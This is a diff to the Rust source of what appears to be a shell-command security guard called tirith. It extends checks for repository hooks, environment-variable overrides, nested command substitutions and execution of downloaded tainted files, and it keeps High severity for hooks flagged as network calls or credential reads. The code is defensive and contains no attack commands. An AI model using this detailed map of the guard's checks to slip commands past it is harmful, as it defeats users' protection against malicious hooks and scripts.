@@ -19,6 +19,47 @@ fn extract_raw_path_from_url(raw: &str) -> Option<String> {
     None
 }
 
+const MAX_EXECUTABLE_BODY_DEPTH: usize = 8;
+
+/// Collect only the nested shell bodies that will execute as part of `input`.
+/// This intentionally does not call `analyze` recursively: command cards,
+/// policy discovery, audit state, and other outer-command side effects remain
+/// single-shot.  Pure Tier-3 command families can consume these bodies alongside
+/// the root input so a grouped command has the same controls as a top-level one.
+fn collect_nested_executable_inputs(
+    input: &str,
+    shell: ShellType,
+) -> (Vec<crate::extract::ExecutableBody>, bool) {
+    fn collect(
+        input: &str,
+        shell: ShellType,
+        depth: usize,
+        out: &mut Vec<crate::extract::ExecutableBody>,
+        incomplete: &mut bool,
+    ) {
+        let scan = crate::extract::executable_substitution_scan(input, shell);
+        *incomplete |= scan.gap.is_some();
+        if depth >= MAX_EXECUTABLE_BODY_DEPTH {
+            *incomplete |= !scan.bodies.is_empty();
+            return;
+        }
+        for body in scan.bodies {
+            let nested_input = body.input.clone();
+            let nested_shell = body.shell;
+            let mut execution_body = body;
+            execution_body.input =
+                crate::extract::shell_execution_view(&nested_input, nested_shell).into_owned();
+            out.push(execution_body);
+            collect(&nested_input, nested_shell, depth + 1, out, incomplete);
+        }
+    }
+
+    let mut bodies = Vec::new();
+    let mut incomplete = false;
+    collect(input, shell, 0, &mut bodies, &mut incomplete);
+    (bodies, incomplete)
+}
+
 /// Owned backing for a custom-rule-DSL [`crate::custom_rule_dsl::DslEvalContext`]
 /// (which borrows `&str`). Built ONCE (only when a DSL rule exists) by
 /// [`build_dsl_backing`]; borrowed via [`Self::as_eval_context`]. Public so
@@ -159,8 +200,7 @@ pub fn build_dsl_backing(
     // refs. Reputation is a real tri-state (CodeRabbit M13 finding C).
     let mut packages: Vec<(String, String, crate::custom_rule_dsl::PkgReputation)> = Vec::new();
     if scan_context != ScanContext::FileScan {
-        let segments = crate::tokenize::tokenize(analyzed_input, shell);
-        for pkg in crate::rules::threatintel::extract_packages_for_shell(&segments, shell) {
+        for pkg in crate::rules::threatintel::extract_packages_from_input(analyzed_input, shell) {
             // Use the same registry identity as ThreatDb writer/lookups. A
             // global lowercase would corrupt case-sensitive Go/Maven/npm keys,
             // while raw spelling would miss PyPI/NuGet equivalents.
@@ -942,12 +982,16 @@ impl ScanSnapshot {
 /// classify it with the three cheap, stat-free checks. Caller gates this behind
 /// `policy.exec_guard_enabled` + `ScanContext::Exec`. Does NOT unwrap `sudo`/`env`
 /// (that's `tirith exec check`); a bare name not on `$PATH` produces no finding.
-fn check_exec_provenance_hot(ctx: &AnalysisContext, command: &str) -> Vec<Finding> {
+fn check_exec_provenance_hot(
+    ctx: &AnalysisContext,
+    command: &str,
+    shell: ShellType,
+) -> Vec<Finding> {
     use crate::tokenize;
 
     // `command` is prelude-STRIPPED (no `# tirith-card:` marker) so the leader is
     // the real command. Card detection still runs on the original `ctx.input`.
-    let segs = tokenize::tokenize(command, ctx.shell);
+    let segs = tokenize::tokenize(command, shell);
     let Some(leader) = segs.first().and_then(|s| s.command.as_deref()) else {
         return Vec::new();
     };
@@ -985,70 +1029,362 @@ fn check_exec_provenance_hot(ctx: &AnalysisContext, command: &str) -> Vec<Findin
     crate::path_audit::leader_findings(&locations, &resolved.path.display().to_string())
 }
 
-/// M9 ch6 — cheap tier-1 force-past predicate: does the leader + first subcommand
-/// match a hook-triggering shape (`git commit`, `npm install`, …)? Defers to
-/// [`crate::repo_hooks::is_hook_triggering_leader`]; keeps an arbitrary command
-/// under a hooks-guard-on repo fast-exiting.
-fn leader_is_hook_triggering(ctx: &AnalysisContext, command: &str) -> bool {
+/// M9 ch6 — cheap tier-1 force-past predicate: does any shell segment resolve to
+/// a hook-triggering command (`git commit`, `npm install`, …)? Passing every
+/// argument is load-bearing for updating Git operations: destination-tree
+/// inspection must see global flags and the exact target.
+fn input_has_hook_triggering_segment(command: &str, shell: ShellType) -> bool {
     use crate::tokenize;
+    let segs = tokenize::tokenize(command, shell);
+    segs.iter().any(|segment| {
+        crate::rules::command::resolve_effective_command(segment, shell)
+            .ok()
+            .and_then(|effective| {
+                effective.segment.command.map(|raw_leader| {
+                    let leader = crate::rules::command::normalize_cmd_base(&raw_leader, shell);
+                    let args: Vec<String> = effective
+                        .segment
+                        .args
+                        .iter()
+                        .map(|arg| crate::rules::command::normalize_shell_token(arg, shell))
+                        .collect();
+                    crate::repo_hooks::is_hook_triggering_command(&leader, &args)
+                })
+            })
+            .unwrap_or(false)
+    })
+}
+
+fn is_git_context_environment_name(name: &str) -> bool {
+    let name = name.to_ascii_uppercase();
+    matches!(
+        name.as_str(),
+        "GIT_DIR"
+            | "GIT_WORK_TREE"
+            | "GIT_COMMON_DIR"
+            | "GIT_INDEX_FILE"
+            | "GIT_OBJECT_DIRECTORY"
+            | "GIT_ALTERNATE_OBJECT_DIRECTORIES"
+            | "GIT_CONFIG"
+            | "GIT_CONFIG_COUNT"
+            | "GIT_CONFIG_PARAMETERS"
+            | "GIT_CONFIG_SYSTEM"
+            | "GIT_CONFIG_GLOBAL"
+            | "GIT_CONFIG_NOSYSTEM"
+            | "GIT_CEILING_DIRECTORIES"
+            | "GIT_DISCOVERY_ACROSS_FILESYSTEM"
+    ) || name.starts_with("GIT_CONFIG_KEY_")
+        || name.starts_with("GIT_CONFIG_VALUE_")
+}
+
+fn environment_explicitly_unsets(
+    environment: &crate::rules::command::EffectiveEnvironment,
+    name: &str,
+) -> bool {
+    use crate::rules::command::EffectiveEnvironmentValue;
+    environment.values.iter().any(|(candidate, value)| {
+        environment_names_equal(candidate, name)
+            && matches!(value, EffectiveEnvironmentValue::Unset)
+    })
+}
+
+#[cfg(windows)]
+fn environment_names_equal(left: &str, right: &str) -> bool {
+    left.eq_ignore_ascii_case(right)
+}
+
+#[cfg(not(windows))]
+fn environment_names_equal(left: &str, right: &str) -> bool {
+    left == right
+}
+
+fn environment_redirects_git_context_with_ambient(
+    environment: &crate::rules::command::EffectiveEnvironment,
+    ambient_names: &[String],
+) -> bool {
+    use crate::rules::command::EffectiveEnvironmentValue;
+
+    // `env -i` changes HOME/global config and may also remove ambient Git
+    // redirections. Re-resolving that entire alternate identity is outside this
+    // hot guard, so it remains conservatively blocked.
+    if environment.clear_ambient {
+        return true;
+    }
+    if environment.values.iter().any(|(name, value)| {
+        (is_git_context_environment_name(name)
+            && !matches!(value, EffectiveEnvironmentValue::Unset))
+            || matches!(
+                name.to_ascii_uppercase().as_str(),
+                "HOME"
+                    | "XDG_CONFIG_HOME"
+                    | "USERPROFILE"
+                    | "HOMEDRIVE"
+                    | "HOMEPATH"
+                    | "PROGRAMDATA"
+            )
+    }) {
+        return true;
+    }
+    ambient_names.iter().any(|name| {
+        is_git_context_environment_name(name) && !environment_explicitly_unsets(environment, name)
+    })
+}
+
+fn environment_redirects_git_context(
+    environment: &crate::rules::command::EffectiveEnvironment,
+) -> bool {
+    let ambient_names: Vec<String> = std::env::vars_os()
+        .filter_map(|(name, _)| name.into_string().ok())
+        .collect();
+    environment_redirects_git_context_with_ambient(environment, &ambient_names)
+}
+
+fn is_package_context_environment_name(name: &str) -> bool {
+    matches!(
+        name.to_ascii_uppercase().as_str(),
+        "NPM_CONFIG_PREFIX"
+            | "NPM_CONFIG_GLOBAL"
+            | "NPM_CONFIG_WORKSPACE"
+            | "NPM_CONFIG_WORKSPACES"
+            | "NPM_CONFIG_INCLUDE_WORKSPACE_ROOT"
+            | "NPM_CONFIG_LOCATION"
+            | "NPM_CONFIG_USERCONFIG"
+            | "NPM_CONFIG_GLOBALCONFIG"
+            | "NPM_CONFIG_FILTER"
+            | "NPM_CONFIG_DIR"
+            | "PROJECT_CWD"
+            | "YARN_RC_FILENAME"
+            | "BUN_INSTALL_GLOBAL_DIR"
+            | "BUN_INSTALL_GLOBAL_BIN"
+    )
+}
+
+fn is_package_config_location_environment_name(name: &str) -> bool {
+    matches!(
+        name.to_ascii_uppercase().as_str(),
+        "HOME" | "XDG_CONFIG_HOME" | "USERPROFILE" | "HOMEDRIVE" | "HOMEPATH"
+    )
+}
+
+fn environment_redirects_package_context_with_ambient(
+    environment: &crate::rules::command::EffectiveEnvironment,
+    ambient_names: &[String],
+) -> bool {
+    use crate::rules::command::EffectiveEnvironmentValue;
+
+    if environment.clear_ambient {
+        return true;
+    }
+    if environment.values.iter().any(|(name, value)| {
+        is_package_config_location_environment_name(name)
+            || (is_package_context_environment_name(name)
+                && !matches!(value, EffectiveEnvironmentValue::Unset))
+    }) {
+        return true;
+    }
+    ambient_names.iter().any(|name| {
+        is_package_context_environment_name(name)
+            && !environment_explicitly_unsets(environment, name)
+    })
+}
+
+fn environment_redirects_package_context(
+    environment: &crate::rules::command::EffectiveEnvironment,
+) -> bool {
+    let ambient_names: Vec<String> = std::env::vars_os()
+        .filter_map(|(name, _)| name.into_string().ok())
+        .collect();
+    environment_redirects_package_context_with_ambient(environment, &ambient_names)
+}
+
+fn environment_changes_executable_resolution(
+    environment: &crate::rules::command::EffectiveEnvironment,
+) -> bool {
+    environment
+        .values
+        .keys()
+        .any(|name| matches!(name.to_ascii_uppercase().as_str(), "PATH" | "PATHEXT"))
+}
+
+fn runtime_git_matches_hook_inspector(
+    ctx: &AnalysisContext,
+    raw_leader: &str,
+    shell: ShellType,
+) -> bool {
+    let leader = crate::rules::command::normalize_shell_token(raw_leader, shell);
+    let cwd = ctx
+        .cwd
+        .as_deref()
+        .map(std::path::PathBuf::from)
+        .or_else(|| std::env::current_dir().ok());
+    let home = home::home_dir();
+    let path_value = std::env::var("PATH").unwrap_or_default();
+    crate::path_audit::resolve_leader(&leader, cwd.as_deref(), home.as_deref(), &path_value)
+        .is_some_and(|resolved| {
+            crate::repo_hooks::runtime_git_matches_trusted_inspector(&resolved.path)
+        })
+}
+
+fn nearest_package_project_root(cwd: &std::path::Path) -> Option<std::path::PathBuf> {
+    let mut current = cwd.to_path_buf();
+    for _ in 0..64 {
+        match std::fs::symlink_metadata(current.join("package.json")) {
+            Ok(_) => return Some(current),
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+            Err(_) => return None,
+        }
+        let parent = current.parent()?;
+        if parent == current {
+            return None;
+        }
+        current = parent.to_path_buf();
+    }
+    None
+}
+
+fn leader_is_hook_triggering(ctx: &AnalysisContext, command: &str) -> bool {
     // Prelude-STRIPPED so a `# tirith-card:` marker can't mask the real leader.
-    let segs = tokenize::tokenize(command, ctx.shell);
-    let Some(first) = segs.first() else {
-        return false;
-    };
-    let Some(leader) = first.command.as_deref() else {
-        return false;
-    };
-    let leader = leader.trim_matches(|c: char| c == '"' || c == '\'');
-    let subcommand = first
-        .args
-        .iter()
-        .map(|a| a.trim_matches(|c: char| c == '"' || c == '\''))
-        .find(|a| !a.is_empty() && !a.starts_with('-'));
-    crate::repo_hooks::is_hook_triggering_leader(leader, subcommand)
+    let (nested, incomplete) = collect_nested_executable_inputs(command, ctx.shell);
+    incomplete
+        || input_has_hook_triggering_segment(command, ctx.shell)
+        || nested
+            .iter()
+            .any(|body| input_has_hook_triggering_segment(&body.input, body.shell))
 }
 
 /// M9 ch6 — repo-hook guard HOT subset: for a hook-triggering leader, scan ONLY
-/// the hook types that leader triggers and return network/credential/sudo
-/// findings at WARN (Medium). Caller gates behind `policy.hooks_guard_enabled` +
-/// `ScanContext::Exec`. A non-triggering leader or no repo root yields nothing;
-/// per-leader targeting + the 60s mtime cache live in
-/// `repo_hooks::scan_triggered_by_leader`.
+/// the hook types that leader triggers. High inventory findings remain High at
+/// the execution boundary (and therefore block); Medium body findings remain
+/// warnings. Updating Git commands additionally inspect the destination
+/// tree/index. An ambiguous or unreadable surface yields a High
+/// `AnalysisIncomplete` finding and therefore blocks.
+/// Caller gates behind `policy.hooks_guard_enabled` + `ScanContext::Exec`.
 fn check_repo_hooks_hot(ctx: &AnalysisContext, command: &str) -> Vec<Finding> {
     use crate::tokenize;
 
-    // Prelude-STRIPPED so the leader/subcommand come from the real command.
+    // Prelude-STRIPPED so leaders/subcommands come from the real command.
     let segs = tokenize::tokenize(command, ctx.shell);
-    let Some(first) = segs.first() else {
-        return Vec::new();
-    };
-    let Some(leader) = first.command.as_deref() else {
-        return Vec::new();
-    };
-    let leader = leader.trim_matches(|c: char| c == '"' || c == '\'');
-    if leader.is_empty() {
-        return Vec::new();
+    let git_root = crate::policy::find_repo_root(ctx.cwd.as_deref());
+    // Package lifecycle and direnv state are rooted at the command's effective
+    // cwd, not necessarily the enclosing Git root. This also covers unpacked
+    // packages with no `.git` directory and nested monorepo packages.
+    let command_cwd = ctx
+        .cwd
+        .as_deref()
+        .map(std::path::PathBuf::from)
+        .or_else(|| std::env::current_dir().ok());
+    let mut hook_findings = Vec::new();
+    for (index, segment) in segs.iter().enumerate() {
+        let Ok(effective) = crate::rules::command::resolve_effective_command(segment, ctx.shell)
+        else {
+            continue;
+        };
+        let Some(raw_leader) = effective.segment.command.clone() else {
+            continue;
+        };
+        let leader = crate::rules::command::normalize_cmd_base(&raw_leader, ctx.shell);
+        let args: Vec<String> = effective
+            .segment
+            .args
+            .iter()
+            .map(|arg| crate::rules::command::normalize_shell_token(arg, ctx.shell))
+            .collect();
+        if leader.is_empty() || !crate::repo_hooks::is_hook_triggering_command(&leader, &args) {
+            continue;
+        }
+
+        // Every segment is analyzed before the shell executes segment zero. A
+        // prior command can change cwd, refs, the index, or tracked hook files,
+        // so a later lifecycle command has no immutable destination to inspect.
+        // Refuse the sequence instead of blessing it from the initial snapshot.
+        if index > 0 {
+            hook_findings.push(crate::repo_hooks::sequenced_hook_command_block(
+                git_root.as_deref().or(command_cwd.as_deref()),
+            ));
+            continue;
+        }
+
+        let base = leader
+            .trim_matches(|character: char| character == '\'' || character == '"')
+            .rsplit(['/', '\\'])
+            .next()
+            .unwrap_or(&leader);
+        let package_manager = matches!(
+            base.to_ascii_lowercase().as_str(),
+            "npm" | "yarn" | "pnpm" | "bun"
+        );
+        let package_root = if package_manager {
+            command_cwd
+                .as_deref()
+                .and_then(nearest_package_project_root)
+        } else {
+            None
+        };
+        let scan_root = if base.eq_ignore_ascii_case("git") {
+            git_root.as_deref()
+        } else if package_manager {
+            package_root.as_deref()
+        } else {
+            command_cwd.as_deref()
+        };
+        if effective.execution_context_changed || effective.saw_sudo {
+            hook_findings.push(crate::repo_hooks::execution_context_override_block(
+                scan_root.or(git_root.as_deref()).or(command_cwd.as_deref()),
+                &leader,
+            ));
+            continue;
+        }
+        if base.eq_ignore_ascii_case("git")
+            && (environment_changes_executable_resolution(&effective.environment)
+                || !runtime_git_matches_hook_inspector(ctx, &raw_leader, ctx.shell))
+        {
+            hook_findings.push(crate::repo_hooks::git_executable_identity_block(
+                git_root.as_deref(),
+            ));
+            continue;
+        }
+        if base.eq_ignore_ascii_case("git")
+            && environment_redirects_git_context(&effective.environment)
+        {
+            hook_findings.push(crate::repo_hooks::git_environment_override_block(
+                git_root.as_deref(),
+            ));
+            continue;
+        }
+        if package_manager && environment_redirects_package_context(&effective.environment) {
+            hook_findings.push(crate::repo_hooks::package_environment_override_block(
+                scan_root.or(command_cwd.as_deref()),
+                &leader,
+            ));
+            continue;
+        }
+        if let Some(mut segment_findings) =
+            crate::repo_hooks::scan_triggered_by_command(scan_root, &leader, &args)
+        {
+            hook_findings.append(&mut segment_findings);
+        }
     }
-    // First non-flag arg = subcommand (`commit`, `install`, …).
-    let subcommand = first
-        .args
-        .iter()
-        .map(|a| a.trim_matches(|c: char| c == '"' || c == '\''))
-        .find(|a| !a.is_empty() && !a.starts_with('-'));
 
-    let Some(repo_root) = crate::policy::find_repo_root(ctx.cwd.as_deref()) else {
-        return Vec::new();
-    };
+    let (nested, incomplete) = collect_nested_executable_inputs(command, ctx.shell);
+    if incomplete
+        || nested
+            .iter()
+            .any(|body| input_has_hook_triggering_segment(&body.input, body.shell))
+    {
+        // Nested lifecycle commands do not have an immutable destination-tree
+        // snapshot: an outer/group predecessor can change cwd, refs, the index,
+        // or hook files before the nested command executes.  Reuse the existing
+        // sequenced-command block instead of scanning stale state and blessing it.
+        hook_findings.push(crate::repo_hooks::sequenced_hook_command_block(
+            git_root.as_deref().or(command_cwd.as_deref()),
+        ));
+    }
 
-    let Some(hook_findings) =
-        crate::repo_hooks::scan_triggered_by_leader(&repo_root, leader, subcommand)
-    else {
-        return Vec::new();
-    };
-
-    // Only the three hot-eligible rules (network/credential/sudo) surface here,
-    // DOWNGRADED to Medium (WARN, not block); `tirith hooks scan` reports the true
-    // High. The Medium suspicious-shell/external-fetch rules are inventory-only.
+    // Surface every hook-body rule for the actual lifecycle event. Keeping each
+    // classifier's original severity is load-bearing: a confirmed High network,
+    // credential, or privilege hook must not become a warning merely because it
+    // was reached through the runtime guard. AnalysisIncomplete likewise stays
+    // High and fails closed for present-but-uninspectable state.
     hook_findings
         .into_iter()
         .filter(|f| {
@@ -1057,26 +1393,43 @@ fn check_repo_hooks_hot(ctx: &AnalysisContext, command: &str) -> Vec<Finding> {
                 crate::verdict::RuleId::RepoHookNetworkCall
                     | crate::verdict::RuleId::RepoHookCredentialRead
                     | crate::verdict::RuleId::RepoHookSudo
+                    | crate::verdict::RuleId::RepoHookSuspiciousShellPattern
+                    | crate::verdict::RuleId::RepoHookExternalFetch
+                    | crate::verdict::RuleId::AnalysisIncomplete
             )
         })
-        .map(|f| Finding {
-            rule_id: f.rule_id,
-            severity: crate::verdict::Severity::Medium,
-            title: format!("Repo hook `{}` ({})", f.name, f.provider.as_str()),
-            description: format!(
-                "A {} hook triggered by this command was flagged: {}. The hook runs \
-                 automatically — review it with `tirith hooks explain {}`.",
-                f.provider.as_str(),
-                f.detail,
-                f.name
-            ),
-            evidence: vec![crate::verdict::Evidence::Text {
-                detail: format!("{} @ {}", f.detail, f.location),
-            }],
-            human_view: None,
-            agent_view: None,
-            mitre_id: None,
-            custom_rule_id: None,
+        .map(|f| {
+            let incomplete = f.rule_id == crate::verdict::RuleId::AnalysisIncomplete;
+            Finding {
+                rule_id: f.rule_id,
+                severity: f.severity,
+                title: if incomplete {
+                    "Automatic repo hook state could not be inspected".to_string()
+                } else {
+                    format!("Repo hook `{}` ({})", f.name, f.provider.as_str())
+                },
+                description: if incomplete {
+                    format!(
+                        "{}. Automatic hook execution is blocked until the surface can be inspected.",
+                        f.detail
+                    )
+                } else {
+                    format!(
+                        "A {} hook triggered by this command was flagged: {}. The hook runs \
+                         automatically — review it with `tirith hooks explain {}`.",
+                        f.provider.as_str(),
+                        f.detail,
+                        f.name
+                    )
+                },
+                evidence: vec![crate::verdict::Evidence::Text {
+                    detail: format!("{} @ {}", f.detail, f.location),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }
         })
         .collect()
 }
@@ -1084,8 +1437,9 @@ fn check_repo_hooks_hot(ctx: &AnalysisContext, command: &str) -> Vec<Finding> {
 /// Interpreters whose first non-flag file arg is the thing run (`bash
 /// ./install.sh` runs `./install.sh`). Matched by base name; small + literal (hot path).
 const TAINT_INTERPRETER_LEADERS: &[&str] = &[
-    "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python2", "python3", "ruby", "perl",
-    "node", "nodejs", "deno", "bun", "php",
+    "sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "ash", "mksh", "python", "python2",
+    "python3", "ruby", "perl", "node", "nodejs", "deno", "bun", "php", "lua", "tclsh", "rscript",
+    "pwsh",
 ];
 
 /// `source` / `.` builtins — a tainted sourced file fires `CommandSourcedFromTaintedFile`.
@@ -1131,7 +1485,21 @@ fn check_command_manifest_hot(
     // otherwise `allowed[]` exact-matches miss and `dangerous[]` globs match the
     // wrapper, not the real command.
     let command = crate::command_card::strip_card_comment_lines(&ctx.input);
-    let outcome = manifest.evaluate(&command, engine_findings);
+    let mut outcome = manifest.evaluate(&command, engine_findings);
+
+    // `allowed[]` and the invocation-level unknown annotation keep their
+    // existing whole-command semantics. `dangerous[]` is an enforcement
+    // surface, however, so an exact/anchored dangerous command must not become
+    // harmless merely because a wrapper or substitution surrounds it.
+    let (nested, _) = collect_nested_executable_inputs(&command, ctx.shell);
+    for body in nested {
+        let nested_outcome = manifest.evaluate(&body.input, engine_findings);
+        outcome
+            .findings
+            .extend(nested_outcome.findings.into_iter().filter(|finding| {
+                finding.rule_id == crate::verdict::RuleId::RepoCommandDangerousPattern
+            }));
+    }
     (outcome.findings, outcome.matched_allowed_name)
 }
 
@@ -1361,21 +1729,7 @@ fn check_taint_hot_with_store(
     command: &str,
     store: &std::path::Path,
 ) -> Vec<Finding> {
-    use crate::tokenize;
     use crate::verdict::{RuleId, Severity};
-
-    // Prelude-STRIPPED so a `# tirith-card:` marker can't shift the parsing.
-    let segs = tokenize::tokenize(command, ctx.shell);
-    let Some(first) = segs.first() else {
-        return Vec::new();
-    };
-    let Some(leader_raw) = first.command.as_deref() else {
-        return Vec::new();
-    };
-    let leader = leader_raw.trim_matches(|c: char| c == '"' || c == '\'');
-    if leader.is_empty() {
-        return Vec::new();
-    }
 
     let cwd: Option<std::path::PathBuf> = ctx
         .cwd
@@ -1383,67 +1737,164 @@ fn check_taint_hot_with_store(
         .map(std::path::PathBuf::from)
         .or_else(|| std::env::current_dir().ok());
     let cwd_ref = cwd.as_deref();
-    let base = leader.rsplit('/').next().unwrap_or(leader);
-
-    // First non-flag arg (the script path for interpreters/source).
-    let file_arg = first
-        .args
-        .iter()
-        .map(|a| a.trim_matches(|c: char| c == '"' || c == '\''))
-        .find(|a| !a.is_empty() && !a.starts_with('-'));
-
-    // Case 1 — `source`/`.` of a tainted file. Medium.
-    if TAINT_SOURCE_LEADERS.contains(&base) {
-        if let Some(arg) = file_arg {
-            if let Some(entry) =
-                crate::taint::is_tainted_at(store, std::path::Path::new(arg), cwd_ref)
-            {
-                return vec![taint_finding(
-                    RuleId::CommandSourcedFromTaintedFile,
-                    Severity::Medium,
-                    "Sourcing a file downloaded from a risky source",
-                    arg,
-                    &entry,
-                )];
-            }
+    fn collect_segments(
+        input: &str,
+        shell: crate::tokenize::ShellType,
+        depth: usize,
+        out: &mut Vec<(crate::tokenize::Segment, crate::tokenize::ShellType)>,
+    ) -> bool {
+        let execution_view = crate::extract::shell_execution_view(input, shell);
+        out.extend(
+            crate::tokenize::tokenize(execution_view.as_ref(), shell)
+                .into_iter()
+                .map(|segment| (segment, shell)),
+        );
+        let nested = crate::extract::executable_substitution_scan(input, shell).bodies;
+        if nested.is_empty() {
+            return false;
         }
-        return Vec::new();
+        if depth >= 8 {
+            return true;
+        }
+        let mut incomplete = false;
+        for body in nested {
+            // Do not short-circuit: every executable body must contribute its
+            // segments even after one sibling reports an analysis gap.
+            incomplete |= collect_segments(&body.input, body.shell, depth + 1, out);
+        }
+        incomplete
     }
+    let mut segments = Vec::new();
+    if collect_segments(command, ctx.shell, 0, &mut segments) {
+        return vec![Finding {
+            rule_id: RuleId::AnalysisIncomplete,
+            severity: Severity::High,
+            title: "Nested tainted-file analysis exceeded its depth limit".to_string(),
+            description: "Executable shell syntax exceeded Tirith's bounded parser while the \
+                          taint store is active. The command is blocked instead of trusting its \
+                          outer leader."
+                .to_string(),
+            evidence: vec![crate::verdict::Evidence::CommandPattern {
+                pattern: "over-deep nested shell execution".to_string(),
+                matched: command.to_string(),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        }];
+    }
+    // Prelude-STRIPPED so a `# tirith-card:` marker can't shift the parsing.
+    // Inspect every executable segment: a safe first command cannot bless a
+    // tainted background/conditional command later in the same shell input.
+    let mut findings = Vec::new();
+    for (segment, segment_shell) in segments {
+        let (effective, script_operands) =
+            match crate::rules::command::interpreter_script_operands(&segment, segment_shell) {
+                Ok(resolved) => resolved,
+                Err(_) => {
+                    // Fail closed only when an unresolved wrapper still carries a
+                    // path that is actually present in the taint store.
+                    for candidate in
+                        segment
+                            .command
+                            .iter()
+                            .chain(segment.args.iter())
+                            .map(|value| {
+                                crate::rules::command::normalize_shell_token(value, segment_shell)
+                            })
+                    {
+                        if let Some(entry) = crate::taint::is_tainted_at(
+                            store,
+                            std::path::Path::new(&candidate),
+                            cwd_ref,
+                        ) {
+                            findings.push(taint_finding(
+                                RuleId::AnalysisIncomplete,
+                                Severity::High,
+                                "Tainted execution wrapper could not be resolved",
+                                &candidate,
+                                &entry,
+                            ));
+                        }
+                    }
+                    continue;
+                }
+            };
+        let Some(leader_raw) = effective.command.as_deref() else {
+            continue;
+        };
+        let leader = crate::rules::command::normalize_shell_token(leader_raw, segment_shell);
+        if leader.is_empty() {
+            continue;
+        }
+        let base = crate::rules::command::normalize_cmd_base(&leader, segment_shell);
 
-    // Case 2 — interpreter wrapper (`bash ./tainted.sh`). High, against the arg.
-    if TAINT_INTERPRETER_LEADERS.contains(&base) {
-        if let Some(arg) = file_arg {
-            if let Some(entry) =
-                crate::taint::is_tainted_at(store, std::path::Path::new(arg), cwd_ref)
+        // Case 1 — `source`/`.` of a tainted file. Medium.
+        if TAINT_SOURCE_LEADERS.contains(&base.as_str()) {
+            if let Some(arg) = effective
+                .args
+                .iter()
+                .map(|arg| crate::rules::command::normalize_shell_token(arg, segment_shell))
+                .find(|arg| !arg.is_empty() && !arg.starts_with('-'))
             {
-                return vec![taint_finding(
+                if let Some(entry) =
+                    crate::taint::is_tainted_at(store, std::path::Path::new(&arg), cwd_ref)
+                {
+                    findings.push(taint_finding(
+                        RuleId::CommandSourcedFromTaintedFile,
+                        Severity::Medium,
+                        "Sourcing a file downloaded from a risky source",
+                        &arg,
+                        &entry,
+                    ));
+                }
+            }
+            continue;
+        }
+
+        // Case 2 — interpreter wrapper (`env python -W ignore ./tainted.py`).
+        if TAINT_INTERPRETER_LEADERS.contains(&base.as_str()) {
+            for raw_arg in script_operands {
+                let arg = crate::rules::command::normalize_shell_token(&raw_arg, segment_shell);
+                if let Some(entry) =
+                    crate::taint::is_tainted_at(store, std::path::Path::new(&arg), cwd_ref)
+                {
+                    findings.push(taint_finding(
+                        RuleId::ExecOfTaintedFile,
+                        Severity::High,
+                        "Executing a file downloaded from a risky source",
+                        &arg,
+                        &entry,
+                    ));
+                }
+            }
+            continue;
+        }
+
+        // Case 3 — the effective leader itself is an executed file.
+        if taint_leader_is_pathlike(&leader) {
+            if let Some(entry) =
+                crate::taint::is_tainted_at(store, std::path::Path::new(&leader), cwd_ref)
+            {
+                findings.push(taint_finding(
                     RuleId::ExecOfTaintedFile,
                     Severity::High,
                     "Executing a file downloaded from a risky source",
-                    arg,
+                    &leader,
                     &entry,
-                )];
+                ));
             }
         }
-        return Vec::new();
     }
 
-    // Case 3 — the leader itself is the executed file (`./install.sh`). High.
-    if taint_leader_is_pathlike(leader) {
-        if let Some(entry) =
-            crate::taint::is_tainted_at(store, std::path::Path::new(leader), cwd_ref)
-        {
-            return vec![taint_finding(
-                RuleId::ExecOfTaintedFile,
-                Severity::High,
-                "Executing a file downloaded from a risky source",
-                leader,
-                &entry,
-            )];
-        }
-    }
-
-    Vec::new()
+    // Nested extraction can expose the same concrete execution through more
+    // than one segment. Preserve first-seen shell order while dropping only an
+    // exact rule/path duplicate; distinct tainted files remain independently
+    // visible to the caller.
+    let mut seen = std::collections::HashSet::new();
+    findings.retain(|finding| seen.insert((finding.rule_id, finding.description.clone())));
+    findings
 }
 
 /// Build a taint finding, echoing the recorded origin/source (so `tirith why`
@@ -1795,8 +2246,8 @@ fn tmp_roots() -> Vec<std::path::PathBuf> {
 ///   `verdict.rs` tags + distinct enums), not type-enforced: keep `*_hot` limited.
 /// * **M9 ch6 — repo hooks.** Exec only, behind `hooks_guard_enabled`, forced
 ///   past tier-1 only for a hook-triggering leader: scans only that leader's hook
-///   types and surfaces network/credential/sudo DOWNGRADED to Medium (WARN);
-///   `tirith hooks scan` reports the true High.
+///   types, preserving each inventory finding's severity so High automatic
+///   network/credential/sudo execution remains fail-closed at runtime.
 /// * **M10 ch1 — blast-radius (load-bearing).** Always-on, gated by
 ///   `destructive_fs_op`: only [`crate::blast_radius::cheap_check`] (pure
 ///   string-shape; env snapshot passed in). `sudo`/`doas` is unwrapped first
@@ -1840,6 +2291,16 @@ pub fn analyze_returning_policy(ctx: &AnalysisContext) -> (Verdict, Policy) {
     analyze_inner(ctx, true)
 }
 
+/// Run a complete analysis, honor the ordinary process/inline bypass contract,
+/// and return the exact fully-resolved policy snapshot used by that decision.
+///
+/// Proof-carrying shell receipts use this path because their later correlation
+/// recheck must be bound to every effective policy overlay even when an
+/// otherwise-clean command could take the public tier-1 fast path.
+pub fn analyze_force_full_returning_policy(ctx: &AnalysisContext) -> (Verdict, Policy) {
+    analyze_inner_with_policy(ctx, true, None, true)
+}
+
 /// Analyze without applying the process/inline bypass, while returning the one
 /// policy snapshot used for detection. Enforcement surfaces that must retain
 /// raw findings for an audited bypass use this entry point and decide whether
@@ -1867,11 +2328,11 @@ pub(crate) fn analyze_with_policy_without_bypass(
 /// Run a complete analysis without honoring a process/inline bypass and return
 /// the exact fully-resolved policy snapshot used by that analysis.
 ///
-/// This is intentionally crate-private for execution runners. Unlike the public
-/// hot path, it always resolves every policy overlay before rule evaluation and
-/// never takes the tier-1 fast exit. A runner can therefore bind its decision and
-/// subsequent execution to one effective policy snapshot without changing the
-/// latency contract of [`analyze`] or [`analyze_returning_policy`].
+/// This is intentionally crate-private for execution runners. Public analysis
+/// now also resolves the effective policy before its tier-1 gate, but it may
+/// still return early when that policy has no applicable custom/guard work.
+/// Runners use this entry point because execution must always perform the full
+/// rule pass and retain raw findings for audited bypass handling.
 pub(crate) fn analyze_force_full_without_bypass_returning_policy(
     ctx: &AnalysisContext,
 ) -> (Verdict, Policy) {
@@ -1891,11 +2352,12 @@ fn analyze_inner_with_policy(
